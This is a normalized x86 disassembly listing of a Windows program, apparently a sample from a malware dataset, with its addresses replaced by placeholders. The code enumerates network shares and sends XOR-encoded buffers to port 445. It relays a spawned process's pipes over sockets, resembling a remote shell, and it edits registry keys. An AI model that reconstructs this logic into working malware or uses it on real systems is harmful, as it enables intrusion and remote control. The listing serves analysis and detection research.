push 0x5c
je r-xdata
push [ rw-data ]
mov esi [ strrchr@IAT ]
call esi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
lea eax [ esi + 0x3 ]
push eax
call [ strchr@IAT ]
pop ecx
cmp eax ebx
pop ecx
mov [ ebp - 0x18 ] eax
je r-xdata
mov [ ebp - 0x8 ] 0x6
mov [ ebp - 0x423f ] bl
mov esi [ ebp - 0x8 ]
mov [ eax ] bl
mov ecx [ rw-data ]
cmp eax ecx
je r-xdata
inc eax
push 0x5c
push eax
call [ strchr@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ebx
push ebx
push edi
call [ ebp - 0x4 ]
test eax eax
jne r-xdata
push 0x5c
push ecx
call esi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov eax [ ebp - 0x18 ]
inc esi
mov [ eax ] bl
mov [ ebp - 0x2c ] esi
jmp r-xdata
inc esi
push esi
push [ rw-data ]
call strcpy
pop ecx
pop ecx
call sub_403d9d
jmp r-xdata
push [ ebp - 0x14 ]
push 0x40
call [ GlobalAlloc@IAT ]
mov edi eax
mov [ ebp - 0x18 ] edi
cmp [ rw-data ] edi
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x2c ] ecx
jne r-xdata
push edi
call [ GlobalFree@IAT ]
push [ ebp - 0x20 ]
call WNetCloseEnum
mov esi [ ebp - 0x8 ]
cmp esi 0x5
jne r-xdata
cmp [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
jbe r-xdata
cmp eax [ rw-data ]
jne r-xdata
cmp eax [ rw-data ]
jne r-xdata
lea eax [ ebp - 0x44 ]
mov [ ebp - 0x4243 ] esi
push eax
lea eax [ ebp - 0x423f ]
push eax
lea eax [ esi - 0x5 ]
push eax
lea eax [ ebp - 0x423f ]
push eax
call sub_402a8f
lea eax [ ebp - 0x4244 ]
push esi
push eax
call sub_4021a5
add esp 0x18
push [ ebp - 0x14 ]
push ebx
push edi
call memset
add esp 0xc
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push edi
push eax
push [ ebp - 0x20 ]
call [ ebp - 0x1c ]
cmp eax ebx
jne r-xdata
lea esi [ edi + 0x14 ]
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x38 ] 0x6
mov [ ebp - 0x34 ] 0x80000002
mov [ ebp - 0x24 ] ecx
jmp r-xdata
inc [ ebp - 0x4 ]
add esi 0x20
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x10 ]
jb r-xdata
cmp [ esi - 0x10 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp eax ebx
je r-xdata
jmp r-xdata
mov edi [ ebp - 0x8 ]
push [ esi ]
lea eax [ ebp + edi - 0x4244 ]
push eax
call strcpy
push [ esi ]
call strlen
add esp 0xc
add edi eax
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x2
push 0x5c
push eax
call [ strchr@IAT ]
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov eax [ esi - 0xc ]
inc edi
mov [ ebp + edi - 0x4244 ] eax
add edi 0x4
mov [ ebp - 0x8 ] edi
mov edi [ ebp - 0x18 ]
lea eax [ ebp - 0x244 ]
push eax
push [ esi ]
call sub_404f6f
lea eax [ ebp - 0x244 ]
push eax
lea eax [ ebp + edi - 0x4244 ]
push eax
call strcpy
lea eax [ ebp - 0x244 ]
push eax
call strlen
add esp 0x14
add edi eax
inc eax
mov [ esi ] eax
sub_404f6f
cmp [ rw-data ] 0x1
push [ esp + 0x8 ]
jne r-xdata
push [ esp + 0x8 ]
call sub_404f97
mov eax [ esp + 0x8 ]
add eax 0x2
push eax
call sub_4051cd
jmp r-xdata
pop ecx
pop ecx
retn
sub_404f97
push ebp
mov ebp esp
sub esp 0x448
mov eax [ ebp + 0x8 ]
push ebx
push esi
add eax 0x2
push edi
push eax
call [ gethostbyname@IAT ]
mov esi [ sprintf@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x48 ]
push rw-data
push eax
call strcpy
pop ecx
pop ecx
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ inet_ntoa@IAT ]
push eax
lea eax [ ebp - 0x48 ]
push rw-data
push eax
call esi
add esp 0xc
jmp r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x48 ]
push rw-data
push eax
call strcpy
pop ecx
pop ecx
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
mov edi [ GetProcAddress@IAT ]
push rw-data
push ebx
call edi
test eax eax
mov [ ebp - 0x8 ] eax
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call esi
pop ecx
pop ecx
jmp r-xdata
push rw-data
push ebx
call edi
mov ebx eax
xor edi edi
cmp ebx edi
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x48 ]
push eax
push rw-data
lea eax [ ebp - 0x248 ]
push 0x200
push eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call strlen
pop ecx
inc eax
push eax
push [ ebp + 0x8 ]
push edi
push edi
call [ MultiByteToWideChar@IAT ]
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x448 ]
push rw-data
push eax
call [ swprintf@IAT ]
add esp 0xc
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x448 ]
push 0x65
push eax
call [ ebp - 0x8 ]
test eax eax
jne r-xdata
push [ ebp + 0xc ]
call esi
add esp 0xc
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
sub ecx 0x12c
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
push 0x64
pop edx
sub ecx edx
je r-xdata
mov esi [ ebp + 0xc ]
push esi
call strlen
add eax esi
pop ecx
mov [ eax - 0x1 ] 0x53
mov [ eax ] 0x5d
and [ eax + 0x1 ] 0x0
test ah 0x80
je r-xdata
cmp [ eax + 0x8 ] 0x4
lea eax [ ebp - 0x48 ]
push eax
jne r-xdata
sub ecx edx
je r-xdata
push [ ebp - 0x4 ]
call ebx
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx 0x5
jne r-xdata
sub ecx edx
je r-xdata
push [ ebp + 0xc ]
call esi
add esp 0xc
push [ eax + 0xc ]
push ecx
jmp r-xdata
mov eax [ eax + 0xc ]
cmp eax edi
jne r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
lea eax [ ebp - 0x48 ]
sub ecx edx
push eax
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
push [ ebp + 0xc ]
call esi
add esp 0x14
jmp r-xdata
cmp eax 0x1
jne r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
test al 0x18
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
push eax
push 0x5
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
sub_4051cd
push ebp
mov ebp esp
sub esp 0x354
push ebx
push esi
push edi
push 0x22
pop ecx
mov esi rw-data
lea edi [ ebp - 0xc4 ]
push 0x2a
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop ecx
mov esi rw-data
lea edi [ ebp - 0x170 ]
push 0x37
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop ecx
mov esi rw-data
lea edi [ ebp - 0x250 ]
xor eax eax
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
xor [ ebp + eax - 0xc4 ] 0x93
inc eax
cmp eax 0x89
jb r-xdata
xor eax eax
xor [ ebp + eax - 0x170 ] 0x93
inc eax
cmp eax 0xa8
jb r-xdata
xor eax eax
xor [ ebp + eax - 0x250 ] 0x93
inc eax
cmp eax 0xde
jb r-xdata
push [ ebp + 0x8 ]
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
push rw-data
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ inet_ntoa@IAT ]
push eax
jmp r-xdata
push 0x0
push 0x1
pop edi
push edi
push 0x2
pop ebx
push ebx
call [ socket@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call strcpy
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x38 ]
push eax
call strcpy
cmp [ ebp - 0x38 ] 0x0
pop ecx
pop ecx
jne r-xdata
push 0x1bd
mov [ ebp - 0x18 ] bx
call [ htons@IAT ]
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x38 ]
push eax
call [ inet_addr@IAT ]
mov [ ebp - 0x14 ] eax
push 0x8
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] edi
push eax
push 0x8004667e
push esi
call [ ioctlsocket@IAT ]
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x18 ]
push 0x10
push eax
push esi
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x350 ] esi
mov [ ebp - 0x354 ] edi
call [ connect@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x354 ]
push 0x0
push eax
lea eax [ esi + 0x1 ]
push 0x0
push eax
call [ select@IAT ]
test eax eax
jg r-xdata
lea eax [ ebp - 0x38 ]
push eax
push rw-data
push [ ebp + 0xc ]
call [ sprintf@IAT ]
add esp 0xc
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push edi
lea eax [ ebp - 0x38 ]
push [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc4 ]
push 0x89
push eax
push esi
call sub_4053c0
add esp 0x18
test eax eax
je r-xdata
lea eax [ ebp - 0x38 ]
push eax
push rw-data
push [ ebp + 0xc ]
call [ sprintf@IAT ]
add esp 0xc
jmp r-xdata
push ebx
lea eax [ ebp - 0x38 ]
push [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x170 ]
push 0xa8
push eax
push esi
call sub_4053c0
add esp 0x18
test eax eax
je r-xdata
push esi
call [ closesocket@IAT ]
push 0x3
lea eax [ ebp - 0x38 ]
push [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x250 ]
push 0xde
push eax
push esi
call sub_4053c0
add esp 0x18
sub_4053c0
push ebp
mov ebp esp
mov eax 0x1120
call sub_405de0
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx [ ioctlsocket@IAT ]
push edi
push 0x1
pop edi
lea eax [ ebp - 0x4 ]
push eax
push 0x8004667e
push esi
mov [ ebp - 0x4 ] edi
call ebx
push 0x0
and [ ebp - 0x8 ] 0x0
push [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x2
mov [ ebp - 0x11c ] esi
mov [ ebp - 0x120 ] edi
push [ ebp + 0xc ]
push esi
call [ rw-data ]
lea ecx [ ebp - 0xc ]
lea eax [ esi + 0x1 ]
push ecx
lea ecx [ ebp - 0x120 ]
push 0x0
push ecx
push 0x0
push eax
call [ select@IAT ]
test eax eax
jg r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push eax
push 0x8004667e
push esi
call ebx
lea eax [ ebp - 0xc ]
xor ebx ebx
push eax
push ebx
lea eax [ ebp - 0x120 ]
push ebx
push eax
lea eax [ esi + 0x1 ]
push eax
mov [ ebp - 0xc ] 0x4
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x11c ] esi
mov [ ebp - 0x120 ] edi
call [ select@IAT ]
test eax eax
jle r-xdata
push [ ebp + 0x14 ]
push rw-data
jmp r-xdata
push [ ebp + 0x14 ]
push rw-data
push ebx
lea eax [ ebp - 0x1120 ]
push 0x640
push eax
push esi
call [ recv@IAT ]
cmp eax 0xffffffff
jne r-xdata
push [ ebp + 0x18 ]
call [ sprintf@IAT ]
add esp 0xc
push esi
call [ closesocket@IAT ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x1c ] 0x3
jne r-xdata
mov eax edi
xor eax eax
lea ecx [ ebp - 0x10f0 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x1c ] dl
inc eax
inc ecx
inc ecx
cmp eax 0xc
jl r-xdata
and [ ebp + eax - 0x1c ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x14 ]
push rw-data
push [ ebp + 0x18 ]
call [ sprintf@IAT ]
add esp 0x10
sub_405509
push ebp
mov ebp esp
sub esp 0x254
push ebx
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
push rw-data
mov edi eax
push [ ebp + 0x8 ]
call [ strstr@IAT ]
pop ecx
xor ebx ebx
test eax eax
pop ecx
jne r-xdata
push 0x44
lea eax [ ebp - 0x54 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x24 ] bx
push eax
lea eax [ ebp - 0x54 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push ebx
call [ CreateProcessA@IAT ]
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
lea eax [ ebp - 0x254 ]
push eax
call strcpy
mov esi [ strchr@IAT ]
lea eax [ ebp - 0x254 ]
push 0x22
push eax
call esi
add esp 0x10
cmp eax ebx
je r-xdata
inc eax
push 0x22
push eax
call esi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov [ eax ] bl
lea eax [ ebp - 0x254 ]
push 0x5c
push eax
call [ strrchr@IAT ]
pop ecx
cmp eax ebx
pop ecx
je r-xdata
cmp [ eax - 0x1 ] 0x3a
jne r-xdata
mov [ eax ] bl
mov [ eax + 0x1 ] bl
jmp r-xdata
lea eax [ ebp - 0x253 ]
push eax
call edi
sub_4055db
push ecx
mov [ rw-data ] 0x4f
call sub_4040e4
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
pop ecx
retn
lea ecx [ esp ]
push ecx
push eax
push eax
push sub_405608
push eax
push eax
call [ CreateThread@IAT ]
sub_405608
push ebp
mov ebp esp
mov eax 0x1540
call sub_405de0
push ebx
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi [ GetProcAddress@IAT ]
mov edi eax
push rw-data
push edi
call esi
push rw-data
push edi
mov [ ebp - 0x14 ] eax
call esi
push 0x1
mov ebx eax
xor esi esi
pop edi
lea eax [ ebp - 0x2c ]
or [ ebp - 0xc ] 0xffffffff
push esi
push eax
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x8 ] esi
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ rw-data ] edi
mov [ ebp - 0x2c ] 0xc
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] edi
call ebx
lea eax [ ebp - 0x2c ]
push esi
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call ebx
push 0x44
lea eax [ ebp - 0x88 ]
push esi
push eax
call memset
mov eax [ ebp - 0x20 ]
add esp 0xc
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x4c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] 0x101
mov [ ebp - 0x34 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x88 ]
push eax
push esi
push esi
push esi
push edi
push esi
lea eax [ ebp - 0x34 ]
push esi
push eax
push esi
mov [ ebp - 0x58 ] si
call [ CreateProcessA@IAT ]
mov ebx [ Sleep@IAT ]
push 0x3e8
call ebx
call sub_405932
cmp eax esi
mov [ ebp - 0x4 ] eax
je r-xdata
push esi
push [ ebp - 0x44 ]
call [ ebp - 0x14 ]
mov eax edi
mov [ rw-data ] esi
pop edi
pop esi
pop ebx
leave
retn 0x4
cmp [ rw-data ] esi
je r-xdata
push rw-data
push rw-data
jmp r-xdata
cmp [ ebp - 0xc ] esi
jg r-xdata
lea eax [ ebp - 0x8 ]
push esi
push eax
lea eax [ ebp - 0x1540 ]
push [ ebp - 0x8 ]
push eax
push [ ebp - 0x10 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x188 ]
push eax
call strcpy
pop ecx
lea eax [ ebp - 0x188 ]
pop ecx
push eax
call strlen
pop ecx
add eax 0x4
push eax
push edi
push rw-data
push 0x52
push [ rw-data ]
call [ inet_ntoa@IAT ]
push eax
lea eax [ ebp - 0xd40 ]
push eax
call sub_4028dc
lea eax [ ebp - 0xd40 ]
push eax
call strlen
mov edi eax
lea eax [ ebp - 0x188 ]
push eax
call strlen
mov [ ebp + edi - 0xd40 ] eax
lea eax [ ebp - 0x188 ]
push eax
add edi 0x4
call strlen
push eax
lea eax [ ebp - 0x188 ]
push eax
lea eax [ ebp + edi - 0xd40 ]
push eax
call memcpy
lea eax [ ebp - 0x188 ]
push eax
call strlen
add esp 0x34
add edi eax
lea eax [ ebp - 0xd40 ]
push esi
push edi
push eax
push [ ebp - 0x4 ]
call [ rw-data ]
push 0x64
mov eax 0x7ff
cmp [ ebp - 0xc ] eax
ja r-xdata
push [ ebp - 0x4 ]
call sub_4029dd
cmp eax esi
pop ecx
je r-xdata
push [ ebp - 0x4 ]
call [ closesocket@IAT ]
push 0x1
pop edi
cmp [ rw-data ] esi
je r-xdata
push esi
push eax
lea eax [ ebp - 0x1540 ]
push eax
push [ ebp - 0x4 ]
call [ recv@IAT ]
cmp eax esi
jle r-xdata
mov eax [ ebp - 0xc ]
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x4
push eax
push 0x1
push rw-data
push 0x52
push [ rw-data ]
call [ inet_ntoa@IAT ]
push eax
lea eax [ ebp - 0xd40 ]
push eax
call sub_4028dc
lea eax [ ebp - 0xd40 ]
push eax
call strlen
mov edi eax
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp + edi - 0xd40 ] eax
add edi 0x4
lea eax [ ebp - 0x1540 ]
push eax
lea eax [ ebp + edi - 0xd40 ]
push eax
call memcpy
add esp 0x28
add edi [ ebp - 0x8 ]
push [ ebp - 0x4 ]
or [ ebp - 0xc ] 0xffffffff
call [ closesocket@IAT ]
push 0x64
call ebx
call sub_405932
cmp eax esi
mov [ ebp - 0x4 ] eax
je r-xdata
sub [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
push esi
push ecx
push eax
lea eax [ ebp - 0x1540 ]
push eax
push [ ebp - 0x18 ]
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp eax 0x3e800
jge r-xdata
sub edi eax
cmp edi esi
jg r-xdata
push 0xa
jmp r-xdata
push [ ebp - 0x4 ]
call sub_4059b3
cmp eax 0xffffffff
pop ecx
mov [ ebp - 0xc ] eax
je r-xdata
push esi
lea eax [ ebp - 0xd40 ]
push edi
push eax
push [ ebp - 0x4 ]
call [ rw-data ]
cmp eax esi
jl r-xdata
call ebx
push esi
lea eax [ ebp - 0x8 ]
push esi
push eax
lea eax [ ebp - 0x1540 ]
push 0x800
push eax
push [ ebp - 0x10 ]
call [ PeekNamedPipe@IAT ]
cmp [ ebp - 0x8 ] esi
je r-xdata
sub_405932
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov esi [ rw-data ]
push 0x52
pop edi
push 0x0
push 0x1
push 0x2
call [ socket@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push edi
mov [ ebp - 0x10 ] 0x2
call [ htons@IAT ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x10 ]
push 0x10
push eax
push ebx
mov [ ebp - 0xc ] esi
call [ connect@IAT ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
push ebx
call [ closesocket@IAT ]
push rw-data
call [ inet_addr@IAT ]
mov edi [ rw-data ]
mov esi eax
sub_4059b3
push ebp
mov ebp esp
sub esp 0x10
push 0x0
lea eax [ ebp - 0x10 ]
push 0x4
push eax
push [ ebp + 0x8 ]
call [ recv@IAT ]
cmp eax 0x4
je r-xdata
mov eax [ ebp - 0x10 ]
leave
retn
or eax 0xffffffff
leave
retn
sub_4059d9
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x5
pop edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
lea ecx [ ebp - 0x4 ]
lea eax [ esi + 0x5 ]
push ecx
lea ecx [ edi - 0x5 ]
push eax
push ecx
push eax
mov [ esi + 0x1 ] edi
call sub_402a8f
push edi
push esi
call sub_4021a5
push esi
call [ free@IAT ]
add esp 0x1c
pop edi
pop esi
leave
retn
lea eax [ esi + 0x5 ]
mov [ esi ] 0x61
push eax
mov eax [ rw-data ]
lea ecx [ eax + 0x4 ]
push ecx
push [ eax ]
call sub_405b52
lea edi [ eax + 0x5 ]
mov [ ebp - 0x4 ] eax
mov [ esi + edi ] 0x1
inc edi
lea eax [ esi + edi ]
push eax
mov eax [ rw-data ]
lea ecx [ eax + 0x4 ]
push ecx
push [ eax ]
call sub_405bc4
add esp 0x18
mov [ ebp - 0x4 ] eax
add edi eax
sub_405a5c
mov eax [ rw-data ]
push esi
lea esi [ eax + 0x4 ]
push esi
call strlen
lea eax [ eax + esi + 0x1 ]
push eax
mov eax [ rw-data ]
push esi
push [ eax ]
call sub_405d3d
add esp 0x10
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_4040e4
pop esi
retn
sub_405a94
mov eax [ rw-data ]
push esi
push edi
lea esi [ eax + 0x4 ]
push esi
call strlen
lea edi [ eax + esi + 0x1 ]
push edi
call strlen
push [ eax + edi + 0x5 ]
lea eax [ eax + edi + 0x1 ]
lea ecx [ eax + 0x8 ]
push ecx
push [ eax ]
mov eax [ rw-data ]
push edi
push esi
push [ eax ]
call sub_405cee
add esp 0x20
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_4040e4
pop edi
pop esi
retn
sub_405ae2
mov eax [ rw-data ]
push esi
lea esi [ eax + 0x4 ]
push esi
call strlen
lea eax [ eax + esi + 0x1 ]
push eax
mov eax [ rw-data ]
push esi
push [ eax ]
call sub_405c50
add esp 0x10
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_4040e4
pop esi
retn
sub_405b1a
mov eax [ rw-data ]
push esi
lea esi [ eax + 0x4 ]
push esi
call strlen
lea eax [ eax + esi + 0x1 ]
push eax
mov eax [ rw-data ]
push esi
push [ eax ]
call sub_405caa
add esp 0x10
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_4040e4
pop esi
retn
sub_405b52
push ebp
mov ebp esp
push ecx
push ebx
lea eax [ ebp + 0xc ]
push esi
xor ebx ebx
push eax
push 0xf003f
push ebx
mov [ ebp - 0x4 ] ebx
push [ ebp + 0xc ]
xor esi esi
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push edi
xor eax eax
jmp r-xdata
push [ ebp + 0xc ]
call [ RegCloseKey@IAT ]
mov eax esi
pop edi
push edi
call strlen
inc [ ebp - 0x4 ]
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x10 ]
push ebx
push ebx
push ebx
lea edi [ esi + eax ]
lea eax [ ebp + 0x8 ]
push ebx
push eax
push edi
mov [ ebp + 0x8 ] 0x104
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
call [ RegEnumKeyExA@IAT ]
test eax eax
jne r-xdata
sub_405bc4
push ebp
mov ebp esp
push ebx
lea eax [ ebp + 0x8 ]
push esi
xor esi esi
push eax
push 0xf003f
push esi
xor ebx ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push edi
mov edi [ ebp + 0x10 ]
xor eax eax
jmp r-xdata
push [ ebp + 0x8 ]
call [ RegCloseKey@IAT ]
mov eax esi
pop edi
mov eax [ ebp + 0xc ]
inc ebx
mov [ esi + edi + 0x104 ] eax
mov eax [ ebp + 0xc ]
lea esi [ esi + eax + 0x108 ]
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
lea eax [ ebp + 0xc ]
mov [ ebp + 0x10 ] 0x100
push eax
lea eax [ edi + esi + 0x108 ]
push eax
lea eax [ edi + esi + 0x100 ]
push eax
lea eax [ ebp + 0x10 ]
push 0x0
push eax
lea eax [ esi + edi ]
mov [ ebp + 0xc ] 0x2800
push eax
push ebx
push [ ebp + 0x8 ]
call [ RegEnumValueA@IAT ]
test eax eax
jne r-xdata
sub_405c50
push ebp
mov ebp esp
sub esp 0x20
lea eax [ ebp + 0xc ]
push eax
push 0xf003f
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ SHDeleteKeyA@IAT ]
mov esi eax
lea eax [ ebp - 0x20 ]
push esi
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
push [ ebp + 0xc ]
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
leave
retn
xor eax eax
leave
retn
sub_405caa
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0xf003f
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegDeleteValueA@IAT ]
push [ ebp + 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
pop ebp
retn
xor eax eax
pop ebp
retn
sub_405cee
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0xf003f
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegSetValueExA@IAT ]
push [ ebp + 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
pop ebp
retn
xor eax eax
pop ebp
retn
sub_405d3d
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0xc ]
push edi
mov esi 0xf003f
push eax
xor edi edi
push esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push ebx
lea eax [ ebp + 0x8 ]
push edi
push eax
push edi
push esi
push edi
push edi
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegCreateKeyExA@IAT ]
push [ ebp + 0xc ]
mov esi [ RegCloseKey@IAT ]
mov ebx eax
call esi
push [ ebp + 0x8 ]
call esi
xor eax eax
cmp ebx edi
sete al
pop ebx
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_405de0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_405f95
cmp [ rw-data ] ebx
jne r-xdata
call sub_405f80
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_405f92
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
